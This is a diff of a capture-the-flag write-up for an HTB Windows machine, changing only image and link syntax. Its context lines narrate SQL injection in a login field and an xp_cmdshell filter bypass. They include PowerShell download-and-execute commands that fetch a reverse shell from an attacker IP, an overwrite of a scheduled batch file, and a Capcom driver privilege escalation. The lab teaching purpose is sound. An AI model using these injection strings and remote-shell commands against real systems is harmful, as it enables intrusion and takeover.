@@ -20,7 +20,7 @@ With this, we can start proxying traffic through Burp.
 
 Port 80 shows a Street Fighter themed page:
 
-<figure><img src="../../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(56).png>)
 
 There's mention of a 'link' that we are supposed to know. Based on HTB trends, I added `streetfighterclub.htb` to the `/etc/hosts` file. Afterwards, I ran a `gobuster` directory and `wfuzz` subdomain scan on the site.
 
@@ -42,7 +42,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 Interestingly, it just shows us a 403:
 
-<figure><img src="../../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(57).png>)
 
 I noted that this is running Microsoft IIS based on the error. I still ran a `gobuster` scan on this new subdomain, and found one directory:
 
@@ -99,7 +99,7 @@ We found a login page!
 
 The login page looked quite vulnerable to some stuff:
 
-<figure><img src="../../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(58).png>)
 
 Here's the POST request being sent back:
 
@@ -123,13 +123,11 @@ username=test&password=test&logintype=1&B1=LogIn
 
 There was a `logintype` variable, where 1 indicated Administrator and 2 was for Users. Adding any quotes to it causes an Interval Server Error:
 
-
-
-<figure><img src="../../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(59).png>)
 
 I tested this with some basic SQL Injection, and found that `;+--+-` works! We are redirected to the `Welcome.asp` page instead.
 
-<figure><img src="../../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(60).png>)
 
 So this login page was vulnerable to SQL Injection. I tested it a bit and found that there were 6 columns using UNION Injection:
 
@@ -167,33 +165,29 @@ username=wad1awdawd23&password=t123awd34&logintype=3;EXEC+xp_cmdshell+"ping+10.1
 
 However, I got no ping back. In this case, there might be something blocking us on the website. I searched ways to obfuscate it, in case there was Defender or something blocking us, and this site had a pretty good way:
 
-{% embed url="https://www.midnightdba.com/Jen/2016/04/xp_cmdshell-isnt-evil/" %}
+https://www.midnightdba.com/Jen/2016/04/xp_cmdshell-isnt-evil/
 
 Just use `XP_cmdshell` instead of `xp_cmdshell`, and the ping would work:
 
-<figure><img src="../../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(61).png>)
 
 Now, we just need to gain a reverse shell. Since there's something obviously blocking us on the machine, normal methods using `nc.exe` might not work. Oddly, running `powershell.exe` results in a 500, indicating that we might have to use the full PATH for it.
 
 The 64-bit version of Powershell doesn't work oddly. I tried the 32-bit version located in `C:\Windows\SysWOW64`, and it worked properly:
 
-{% code overflow="wrap" %}
 ```powershell
 C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe "iex(new-object net.webclient).downloadstring(\"http://10.10.14.11/rev.ps1\")"
 ```
-{% endcode %}
 
 The final query looks like this:
 
-{% code overflow="wrap" %}
 ```
 1;EXEC+XP_cmdshell+'C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe+"iex(new-object+net.webclient).downloadstring(\"http://10.10.14.11/rev.ps1\")"'--+-
 ```
-{% endcode %}
 
 Take note to rename the shell to `REV.PS1` since the web request sent is in caps for some reason. Afterwards, we would get a shell:
 
-<figure><img src="../../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(62).png>)
 
 ## Privilege Escalation
 
@@ -298,7 +292,7 @@ Normally, I would append something to the end of the file and get it to execute,
 
 Normally we cannot overwrite the file without write permissions, but modify allows us to use `copy` to change the file.
 
-{% embed url="https://stackoverflow.com/questions/45141044/cmd-copy-null-to-multiple-files" %}
+https://stackoverflow.com/questions/45141044/cmd-copy-null-to-multiple-files
 
 ```
 PS C:\users\decoder> cmd /c copy /Y NUL clean.bat
@@ -308,15 +302,13 @@ PS C:\users\decoder> cat clean.bat
 
 Now, we can write anything we want to this file. We can `echo` in the same shell we used earlier:
 
-{% code overflow="wrap" %}
 ```
 cmd /c "echo powershell iex(new-object net.webclient).downloadstring('http://10.10.14.11/REV.PS1') >> clean.bat"
 ```
-{% endcode %}
 
 After waiting for a while, we would get a `decoder` shell:
 
-<figure><img src="../../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(63).png>)
 
 ### Driver Exploit -> SYSTEM
 
@@ -340,11 +332,11 @@ At line:128 char:1
 
 Based on the theme of the machine, I enumerated exploits related to Street Fighter and surprisingly, found an ExploitDB link:
 
-{% embed url="https://www.exploit-db.com/exploits/40451" %}
+https://www.exploit-db.com/exploits/40451
 
 Capcom driver is well-known for granting SYSTEM shells, so let's take a look at that. There are loads of PoCs available. I used this one:
 
-{% embed url="https://github.com/FuzzySecurity/Capcom-Rootkit" %}
+https://github.com/FuzzySecurity/Capcom-Rootkit
 
 The above was the best because it was based on Powershell instead of `.exe` files, which I could not seem to execute anyway. I struggled a bit here in uploading them onto the machine, but eventually resorted to using 0xdf's writeup to combine all of them (which is really smart):
 
@@ -360,7 +352,7 @@ iex(new-object net.webclient).downloadstring('http://10.10.14.11:443/capcom-all'
 
 Then, run the exploit:
 
-<figure><img src="../../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(64).png>)
 
 ### Root.exe + DLL RE -> Flag
 
@@ -395,15 +387,15 @@ We can bring these back to our machine for reverse engineering to find that pass
 
 Afterwards, I opened both in `ghidra`. `root.exe` had a function `FUN_00401000` that performed some character stuff:
 
-<figure><img src="../../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(67).png>)
 
 `checkdll.dll` had a function that XOR'd bytes with 9.
 
-<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(68).png>)
 
 The global variable can be found here by clicking on it:
 
-<figure><img src="../../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(66).png>)
 
 The encryption can be reversed easily by XOR-ing it with 9 and converting to characters.
 
@@ -432,4 +424,4 @@ OdioLaFeta
 
 Then, we can get the flag:
 
-<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(69).png>)
